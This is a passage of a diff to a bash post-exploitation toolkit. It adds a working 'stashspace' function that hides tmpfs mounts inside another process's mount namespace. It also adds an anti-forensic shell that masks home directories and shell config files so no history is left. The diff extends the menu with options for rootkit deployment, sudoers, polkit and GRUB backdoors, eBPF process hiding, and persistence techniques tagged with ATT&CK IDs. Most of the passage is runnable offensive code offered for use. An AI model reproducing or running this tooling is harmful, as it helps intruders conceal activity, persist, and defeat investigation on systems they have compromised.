+    echo -e "  [1] Create stashspace (root)  [2] Create (unprivileged)  [3] Access  [4] Anti-forensic shell  [5] Detect  [6] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            [[ $EUID -ne 0 ]] && { echo "Root required. Use option 2."; return; }
+            read -p "PID to join: " JP; read -p "Mount path [/root]: " SP; SP="${SP:-/root}"
+            nsenter -t "$JP" --mount /bin/bash -c "mount -t tmpfs tmpfs '${SP}' && echo '[+] Stashspace at ${SP}' && exec /bin/bash" ;;
+        2)
+            read -p "Mount path [/tmp]: " SP; SP="${SP:-/tmp}"
+            unshare -m -U --map-root-user /bin/bash -c "mount -t tmpfs tmpfs '${SP}' && echo '[+] Stashspace at ${SP}' && exec /bin/bash" ;;
+        3)
+            read -p "PID to access: " AP
+            [[ $EUID -eq 0 ]] && nsenter -t "$AP" -m /bin/bash || nsenter -t "$AP" -m -U --preserve-credentials /bin/bash ;;
+        4)
+            echo "[*] Anti-forensic: no history, no atime"
+            if [[ $EUID -eq 0 ]]; then
+                unshare -m /bin/bash -c 'mount -t tmpfs tmpfs "$HOME"; for f in /etc/nsswitch.conf /etc/bash.bashrc /etc/profile; do [ -f "$f" ] && mount --bind /dev/null "$f" 2>/dev/null; done; echo "[+] Active"; exec /bin/bash --norc --noprofile'
+            else
+                unshare -m -U --map-root-user /bin/bash -c 'mount -t tmpfs tmpfs "$HOME"; echo "[+] Active"; exec /bin/bash --norc --noprofile'
+            fi ;;
+        5)
+            DEFAULT_NS=$(readlink /proc/$$/ns/mnt)
+            ps -eo pid,ppid,comm --no-headers 2>/dev/null | while read -r pid ppid comm; do
+                [[ "$ppid" == "2" ]] && continue; [[ -e "/proc/$pid/ns/mnt" ]] || continue
+                ns=$(readlink "/proc/$pid/ns/mnt" 2>/dev/null); [[ "$ns" == "$DEFAULT_NS" ]] && continue
+                grep -qE 'system.slice|init.scope|systemd' "/proc/$pid/cgroup" 2>/dev/null && continue
+                echo "  [!] PID $pid ($comm) ns=$ns"
+            done ;;
+        6) [[ -f /var/tmp/.d3m0n_stash_pid ]] && { kill $(cat /var/tmp/.d3m0n_stash_pid) 2>/dev/null; rm -f /var/tmp/.d3m0n_stash_pid; }
+            rm -f /var/tmp/.d3m0n_stashd; echo "[+] Cleaned" ;;
+    esac
+}
+
 banner() {
     :
 }
@@ -3515,6 +3967,17 @@ menu() {
                                   [55] Windows Defense Evasion Generator (7 techniques)
                                   [56] Windows Credential Access Generator (5 techniques)
                                   [57] Windows Stealth & Indicator Removal (4 techniques)
+
+                                  ═══ Advanced Techniques (Research) ═══
+                                  [58] Diamorphine Rootkit Auto-Deploy (T1014)
+                                  [59] Systemd Generator Persistence (T1543.002)
+                                  [60] NetworkManager Dispatcher Persistence (T1546)
+                                  [61] Polkit Privilege Escalation Backdoor (T1548)
+                                  [62] Sudoers Backdoor (T1548.003)
+                                  [63] eBPF-Based Process/File Hiding (T1564)
+                                  [64] Modprobe.d Event Hijacking (T1547.006)
+                                  [65] GRUB Bootloader Backdoor (T1542)
+                                  [66] Mount Namespace Stashspace (T1564.001)
 
     [*] Coming soon others features [*]
 
@@ -3638,6 +4101,24 @@ EOF
         winCredAccess
     elif [ "$MENUINPUT" == "57" ] || [ "$MENUINPUT" == "57" ]; then
         winStealth
+    elif [ "$MENUINPUT" == "58" ] || [ "$MENUINPUT" == "58" ]; then
+        diamorphineRootkit
+    elif [ "$MENUINPUT" == "59" ] || [ "$MENUINPUT" == "59" ]; then
+        systemdGenerator
+    elif [ "$MENUINPUT" == "60" ] || [ "$MENUINPUT" == "60" ]; then
+        nmDispatcher
+    elif [ "$MENUINPUT" == "61" ] || [ "$MENUINPUT" == "61" ]; then
+        polkitBackdoor
+    elif [ "$MENUINPUT" == "62" ] || [ "$MENUINPUT" == "62" ]; then
+        sudoersBackdoor
+    elif [ "$MENUINPUT" == "63" ] || [ "$MENUINPUT" == "63" ]; then
+        ebpfHide
+    elif [ "$MENUINPUT" == "64" ] || [ "$MENUINPUT" == "64" ]; then
+        modprobeHijack
+    elif [ "$MENUINPUT" == "65" ] || [ "$MENUINPUT" == "65" ]; then
+        grubBackdoor
+    elif [ "$MENUINPUT" == "66" ] || [ "$MENUINPUT" == "66" ]; then
+        nsStashspace
     else 
         echo "This option does not exist"
     fi
